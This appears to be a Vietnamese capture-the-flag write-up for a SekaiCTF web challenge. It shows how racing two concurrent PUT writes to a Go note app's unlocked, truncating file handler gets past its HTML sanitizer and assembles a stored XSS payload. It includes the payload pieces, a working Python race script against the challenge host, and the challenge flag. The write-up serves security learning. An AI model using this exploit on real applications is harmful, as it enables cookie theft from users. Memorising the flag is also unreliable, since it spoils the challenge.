# `web/&lt;\w+`

![alt text](image.png)

## Phân tích source

App Go có 3 route (`app/main.go`): 
- `POST /create` tạo note, nội dung qua sanitizer rồi ghi file `/app/notes/<uuid>`
- `GET /notes/{id}` trả note với `Content-Type: text/html`
- `PUT /notes/{id}` sửa note.

Note render dạng HTML nên đích là nhét XSS vào rồi đưa id cho admin bot.

Sanitizer:

```go
func sanitizer(msg string) (string, error) {
	if len(msg) > 128 { return "", fmt.Errorf("too long message") }
	if utf8.ValidString(msg) == false { return "", fmt.Errorf("invalid character") }

	sanitized := bluemonday.StrictPolicy().Sanitize(msg)

	// &lt;\w+
	sanitized = strings.ReplaceAll(sanitized, "&lt;", "<")
	sanitized = strings.ReplaceAll(sanitized, "&gt;", ">")
	var reHTML = regexp.MustCompile(`<(/)?\w+`)
	sanitized = reHTML.ReplaceAllString(sanitized, "")

	return sanitized, nil
}
```

Bluemonday escape `<` `>` thành `&lt;` `&gt;`, rồi unescape về lại, cuối cùng regex xóa dấu `<` có chữ đứng ngay sau (vd: `<img`, `<script`...).

Vậy trong một request không thể giữ được `<` dính liền chữ. Muốn có `<img` thì phải cho `<` và `img` đến từ hai request rồi ghép lại sau khi qua sanitizer.

## Race condition

Rate limit chỉ đặt cho `/create`, còn `PUT /notes/{id}` ở `location /` nên spam thoải mái; thêm `proxy_request_buffering off` nên request bắn thẳng vào app.

Handler ghi note ra file, `O_TRUNC` cắt file về 0 rồi ghi từ đầu, không lock:

```go
f, _ := os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)
f.Write([]byte(sanitized))
f.Close()
```

Hai PUT cùng lúc mở hai file descriptor riêng, cùng ghi đè từ offset 0. Ta chuẩn bị 2 message qua được sanitizer, ghép byte lại thành payload.

Message A là `&lt;`. Sau khi unescape nó thành `<`, nằm cuối chuỗi nên regex không khớp, còn đúng 1 byte `<`.

Message B là `Bimg/src/onerror=console.log(document.cookie)>`. Không có ký tự `<` nào nên regex bỏ qua; ký tự `B` ở đầu chỉ là byte đệm cho offset 0.

Nếu hai request chạy đúng thứ tự openA, openB, writeB, writeA thì B ghi cả chuỗi trước, rồi A ghi đè mỗi byte 0, biến `B` thành `<`:

```text
<img/src/onerror=console.log(document.cookie)>
```

Khi `GET` trả về với `text/html`, src rỗng nên `onerror` chạy `console.log(document.cookie)`.

## Khai thác

Mỗi vòng cho 1 cặp A+B song song, GET kiểm tra, trúng payload thắng thì dừng ngay rồi nộp id cho bot.

```python
#!/usr/bin/env python3
import concurrent.futures as cf
import sys, requests

BASE = "https://ltw.chals.sekai.team"
A_MSG = "&lt;"
B_MSG = "Bimg/src/onerror=console.log(document.cookie)>"
WIN   = "<img/src/onerror=console.log(document.cookie)>"

s = requests.Session()

def create_note():
    r = s.post(f"{BASE}/create", data={"message": "init"}, allow_redirects=False, timeout=10)
    if r.status_code == 429:
        sys.exit("[!] rate limited /create")
    return r.headers["Location"].rsplit("/", 1)[-1]

def put(nid, msg):
    return s.put(f"{BASE}/notes/{nid}", data={"message": msg}, allow_redirects=False, timeout=10)

def get(nid):
    return s.get(f"{BASE}/notes/{nid}", timeout=10).text

def main():
    nid = create_note()
    print("[*] note id:", nid)
    pool = cf.ThreadPoolExecutor(max_workers=2)
    for i in range(1, 4001):
        fa = pool.submit(put, nid, A_MSG); fb = pool.submit(put, nid, B_MSG)
        fa.result(); fb.result()
        if get(nid) == WIN:
            print(f"[+] WON round {i} -> {BASE}/notes/{nid}")
            return
    print("[!] failed, retry")

main()
```

![alt text](image-1.png)

Sub id cho admin bot:

![alt text](image-2.png)

## Flag

```
SEKAI{l0g1c_l1v3s_1n_c0d3..._vuln_l1v3s_1n_t1m3!}
```